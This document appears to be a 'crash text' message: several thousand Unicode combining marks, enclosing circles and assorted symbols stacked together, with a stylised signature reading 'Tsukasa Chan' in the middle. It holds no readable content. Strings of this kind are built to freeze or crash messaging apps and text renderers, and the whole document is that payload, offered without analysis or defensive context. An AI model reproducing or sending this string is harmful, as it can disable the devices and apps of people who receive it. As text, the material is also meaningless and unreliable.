⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝.⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙⃙ุᡃᡃᡃᡃᡃᡃᡃᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ✘͢͢ۦོ͢⇣͢✰͢↬✘͢͢ۦོ͢⇣͢✰͢↬❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃢⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽͊͊͊❂❂⃟⃢͓͓͓͓͓͓͓͓͓͓͓͓͓͓͓̽̽̽̽̽̽̽̽̽̽̽̽̽̽̽⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟❂⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟⃟<\ 𝕿𝖘𝖚𝖐𝖆𝖘𝖆͜͡ 𝕮𝖍𝖆𝖓.々ʹ⁩𝜘͢͢ۦོ͢⇣͢✰͢𓊑𓀦𓀗𓀦𓀗𓊑ؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖؖᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶̶⃙⃙⃙⃙⃙⃚⃚⃚⃚⃚⃫⃫⃫⃫⃫.̶̶̶̶⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝⃝⃝⃝⃝⃝⃝⃝⃝⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝ᡃ⃝